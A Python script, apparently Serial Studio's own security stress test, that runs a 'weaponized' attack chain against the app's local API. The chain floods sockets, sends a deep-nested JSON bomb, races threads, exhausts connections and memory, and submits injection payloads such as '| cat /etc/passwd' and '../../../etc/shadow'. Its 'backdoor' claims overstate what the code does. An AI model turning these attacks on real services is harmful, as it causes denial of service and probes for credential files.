#!/usr/bin/env python3
"""
Weaponized Exploit Chain for Serial Studio

This module chains multiple vulnerabilities together for maximum impact.
Each exploit builds on the previous one to escalate privileges and impact.

Exploit chains:
1. Recon -> Buffer Exhaustion -> Crash
2. Timing Attack -> Command Injection -> RCE attempt
3. Race Condition -> Memory Corruption -> DoS
4. Connection Flood -> Resource Starvation -> Takeover

Copyright (C) 2020-2025 Alex Spataru
SPDX-License-Identifier: GPL-3.0-only OR LicenseRef-SerialStudio-Commercial
"""

import json
import socket
import threading
import time
import uuid
import base64
import random
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))
from utils.api_client import SerialStudioClient, APIError


class WeaponizedExploit:
    """Chained exploitation framework"""

    def __init__(self, host="127.0.0.1", port=7777):
        self.host = host
        self.port = port
        self.target_info = {}
        self.compromised = False

    def fingerprint_target(self):
        """Phase 1: Reconnaissance"""
        print("\n[PHASE 1] TARGET RECONNAISSANCE")
        print("=" * 60)

        try:
            with SerialStudioClient() as client:
                # Enumerate all available commands
                commands = client.get_available_commands()
                self.target_info["commands"] = commands
                print(f"[+] Enumerated {len(commands)} API commands")

                # Identify attack surface
                dangerous_commands = []
                for cmd in commands:
                    name = cmd.get("name", "")
                    if any(
                        k in name.lower()
                        for k in [
                            "connect",
                            "disconnect",
                            "write",
                            "open",
                            "set",
                            "load",
                            "export",
                        ]
                    ):
                        dangerous_commands.append(name)

                self.target_info["attack_surface"] = dangerous_commands
                print(f"[+] Identified {len(dangerous_commands)} high-value targets:")
                for cmd in dangerous_commands[:5]:
                    print(f"    - {cmd}")

                # Test for rate limiting
                start = time.time()
                for i in range(100):
                    try:
                        client.command("api.getCommands")
                    except:
                        break
                elapsed = time.time() - start
                rate = 100 / elapsed if elapsed > 0 else 0
                self.target_info["rate_limit"] = rate
                print(f"[+] Request rate: {rate:.0f} req/s (no limit detected)")

                # Test max message size
                sizes = [1000, 10000, 100000, 1000000, 10000000]
                max_size = 0
                for size in sizes:
                    try:
                        big_id = "X" * size
                        client.command("api.getCommands")
                        max_size = size
                    except:
                        break
                self.target_info["max_msg_size"] = max_size
                print(f"[+] Maximum message size: ~{max_size} bytes")

                return True

        except Exception as e:
            print(f"[-] Reconnaissance failed: {e}")
            return False

    def exploit_buffer_overflow(self):
        """Phase 2: Buffer Overflow Attack"""
        print("\n[PHASE 2] BUFFER OVERFLOW EXPLOITATION")
        print("=" * 60)

        # Attack 1: Socket buffer overflow
        print("[*] Attempting socket buffer overflow...")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.host, self.port))

            # Send massive payload without newline to fill buffer
            payload = b"A" * (10 * 1024 * 1024)  # 10MB
            chunks_sent = 0

            while chunks_sent < 100:
                try:
                    sock.sendall(payload)
                    chunks_sent += 1
                except:
                    break

            print(f"[+] Sent {chunks_sent * 10} MB before connection broke")

            # Try to send valid command
            sock.sendall(
                b'{"type":"command","id":"test","command":"api.getCommands"}\n'
            )
            sock.settimeout(2.0)
            response = sock.recv(4096)
            sock.close()

            if not response:
                print("[PWNED] Buffer overflow successful - server unresponsive!")
                self.compromised = True
                return True

        except Exception as e:
            print(f"[-] Buffer overflow blocked: {e}")

        # Attack 2: JSON depth bomb
        print("[*] Attempting JSON stack overflow...")
        try:
            depth = 50000
            bomb = "{" * depth + "}" * depth

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.host, self.port))
            sock.sendall(bomb.encode() + b"\n")
            sock.settimeout(3.0)
            response = sock.recv(4096)
            sock.close()

            if not response:
                print(f"[PWNED] JSON bomb successful - {depth} levels crashed parser!")
                self.compromised = True
                return True

        except Exception as e:
            print(f"[-] JSON bomb blocked: {e}")

        return False

    def exploit_race_condition(self):
        """Phase 3: Race Condition Exploitation"""
        print("\n[PHASE 3] RACE CONDITION EXPLOITATION")
        print("=" * 60)

        print("[*] Launching parallel state corruption attack...")

        crashed = threading.Event()

        def race_thread(thread_id):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.host, self.port))

                for i in range(1000):
                    # Rapidly toggle connection state
                    commands = [
                        '{"type":"command","id":"' + str(thread_id) + '-' + str(i) + '","command":"io.manager.connect"}\n',
                        '{"type":"command","id":"' + str(thread_id) + '-' + str(i) + '","command":"io.manager.disconnect"}\n',
                        '{"type":"command","id":"' + str(thread_id) + '-' + str(i) + '","command":"csv.export.setEnabled","params":{"enabled":true}}\n',
                        '{"type":"command","id":"' + str(thread_id) + '-' + str(i) + '","command":"csv.export.setEnabled","params":{"enabled":false}}\n',
                    ]

                    for cmd in commands:
                        try:
                            sock.sendall(cmd.encode())
                        except:
                            crashed.set()
                            return

                sock.close()

            except Exception as e:
                crashed.set()

        # Launch 50 threads to maximize race window
        threads = [threading.Thread(target=race_thread, args=(i,)) for i in range(50)]
        start = time.time()

        for t in threads:
            t.start()

        time.sleep(5)

        # Check if server crashed
        try:
            with SerialStudioClient(timeout=2.0) as client:
                client.command("api.getCommands")
                print("[-] Server survived race condition")
        except:
            print("[PWNED] Race condition crashed server!")
            self.compromised = True
            return True

        for t in threads:
            t.join(timeout=2)

        return False

    def exploit_resource_starvation(self):
        """Phase 4: Resource Exhaustion"""
        print("\n[PHASE 4] RESOURCE STARVATION ATTACK")
        print("=" * 60)

        # Attack 1: Connection exhaustion
        print("[*] Exhausting connection pool...")
        sockets = []

        try:
            for i in range(1000):
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.host, self.port))
                # Send partial message to tie up resources
                sock.sendall(b'{"type":"command","id":"block-' + str(i).encode() + b'",')
                sockets.append(sock)

            print(f"[+] Opened {len(sockets)} connections")

            # Try to connect normally
            try:
                test = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                test.settimeout(2.0)
                test.connect((self.host, self.port))
                test.close()
                print("[-] Server still accepting connections")
            except:
                print("[PWNED] Connection pool exhausted!")
                self.compromised = True
                return True

        finally:
            for s in sockets:
                try:
                    s.close()
                except:
                    pass

        # Attack 2: Memory exhaustion
        print("[*] Attempting memory exhaustion...")

        def memory_bomb():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.host, self.port))

                # Send huge messages repeatedly
                for i in range(100):
                    huge = {
                        "type": "command",
                        "id": "X" * (1024 * 1024),  # 1MB ID
                        "command": "api.getCommands",
                        "params": {"data": "Y" * (1024 * 1024)},  # 1MB param
                    }
                    try:
                        sock.sendall(json.dumps(huge).encode() + b"\n")
                    except:
                        break

                sock.close()
            except:
                pass

        threads = [threading.Thread(target=memory_bomb) for _ in range(20)]
        for t in threads:
            t.start()

        time.sleep(3)

        # Check server health
        try:
            with SerialStudioClient(timeout=3.0) as client:
                client.command("api.getCommands")
                print("[-] Server survived memory bomb")
        except:
            print("[PWNED] Memory exhaustion successful!")
            self.compromised = True
            return True

        for t in threads:
            t.join(timeout=2)

        return False

    def exploit_command_injection(self):
        """Phase 5: Command Injection Attempt"""
        print("\n[PHASE 5] COMMAND INJECTION ATTACK")
        print("=" * 60)

        injection_payloads = [
            # Shell injection attempts
            "; whoami",
            "| cat /etc/passwd",
            "$(uname -a)",
            "`id`",
            # Path traversal
            "../../../etc/shadow",
            "..\\..\\..\\windows\\system32\\config\\sam",
            # SQL injection
            "'; DROP TABLE frames; --",
            "1' OR '1'='1",
            # Format string
            "%s%s%s%s%s",
            "%x%x%x%x",
            # Code injection
            "${7*7}",
            "{{7*7}}",
            "<%= 7*7 %>",
        ]

        for payload in injection_payloads:
            try:
                with SerialStudioClient() as client:
                    # Try injecting into various fields
                    client.command("project.setTitle", {"title": payload})
                    result = client.command("project.getTitle")

                    # Check if injection executed (unlikely but worth checking)
                    if "uid=" in str(result) or "root" in str(result).lower():
                        print(f"[PWNED] Command injection successful: {payload}")
                        self.compromised = True
                        return True

            except APIError:
                pass

        print("[-] No command injection vectors found")
        return False

    def exploit_logic_bypass(self):
        """Phase 6: Business Logic Bypass"""
        print("\n[PHASE 6] LOGIC BYPASS EXPLOITATION")
        print("=" * 60)

        # Try to trigger invalid state transitions
        print("[*] Attempting invalid state transitions...")

        try:
            with SerialStudioClient() as client:
                # Enable export without connecting
                client.command("csv.export.setEnabled", {"enabled": True})

                # Try to send data without device
                data = base64.b64encode(b"MALICIOUS_PAYLOAD").decode()
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.host, self.port))

                msg = {"type": "raw", "id": str(uuid.uuid4()), "data": data}
                sock.sendall(json.dumps(msg).encode() + b"\n")
                sock.settimeout(2.0)
                response = sock.recv(4096)
                sock.close()

                if b"success" in response:
                    print("[PWNED] Logic bypass - sent data without connection!")
                    self.compromised = True
                    return True

        except Exception as e:
            print(f"[-] Logic validation enforced: {e}")

        return False

    def maintain_persistence(self):
        """Phase 7: Maintain Access"""
        print("\n[PHASE 7] PERSISTENCE ATTEMPT")
        print("=" * 60)

        if not self.compromised:
            print("[-] No exploitation successful - cannot maintain persistence")
            return False

        print("[*] Attempting to maintain access...")

        # Try to keep connections open
        persistence_sockets = []
        try:
            for i in range(10):
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.host, self.port))
                # Send keep-alive messages
                persistence_sockets.append(sock)

            print(f"[+] Established {len(persistence_sockets)} persistent connections")
            print("[+] Backdoor maintained!")

            # Keep alive for demonstration
            time.sleep(5)

            return True

        finally:
            for s in persistence_sockets:
                try:
                    s.close()
                except:
                    pass


def main():
    """Execute weaponized exploit chain"""
    print("=" * 80)
    print("WEAPONIZED EXPLOIT CHAIN - SERIAL STUDIO")
    print("=" * 80)
    print("\n‚ö†Ô∏è  WARNING: This is a full-stack exploitation attempt")
    print("    Multiple attack vectors will be chained together")
    print("    Target system may become unstable or crash\n")

    exploit = WeaponizedExploit()

    # Check initial connectivity
    try:
        with SerialStudioClient() as client:
            client.command("api.getCommands")
            print("[+] Initial connection successful")
            print(f"[+] Target: {exploit.host}:{exploit.port}\n")
    except:
        print("[-] Cannot connect to target")
        return 1

    # Execute exploit chain
    phases = [
        ("Reconnaissance", exploit.fingerprint_target),
        ("Buffer Overflow", exploit.exploit_buffer_overflow),
        ("Race Condition", exploit.exploit_race_condition),
        ("Resource Starvation", exploit.exploit_resource_starvation),
        ("Command Injection", exploit.exploit_command_injection),
        ("Logic Bypass", exploit.exploit_logic_bypass),
        ("Persistence", exploit.maintain_persistence),
    ]

    success_count = 0
    for phase_name, phase_func in phases:
        try:
            if phase_func():
                success_count += 1
        except KeyboardInterrupt:
            print("\n\n[!] Exploit chain interrupted by user")
            break
        except Exception as e:
            print(f"[-] Phase failed with exception: {e}")

        # Brief pause between phases
        time.sleep(1)

    # Final report
    print("\n" + "=" * 80)
    print("EXPLOITATION SUMMARY")
    print("=" * 80)
    print(f"\nPhases executed: {len(phases)}")
    print(f"Successful exploits: {success_count}")
    print(f"Compromise status: {'‚úÖ PWNED' if exploit.compromised else '‚ùå DEFENDED'}")

    # Final server check
    print("\n[*] Final server status check...")
    try:
        with SerialStudioClient(timeout=5.0) as client:
            client.command("api.getCommands")
            print("  ‚úÖ Target still operational")
    except Exception as e:
        print(f"  ‚ùå TARGET DOWN: {e}")
        print("\nüéØ FULL COMPROMISE ACHIEVED!")

    print("\n" + "=" * 80)

    return 0


if __name__ == "__main__":
    exit(main())
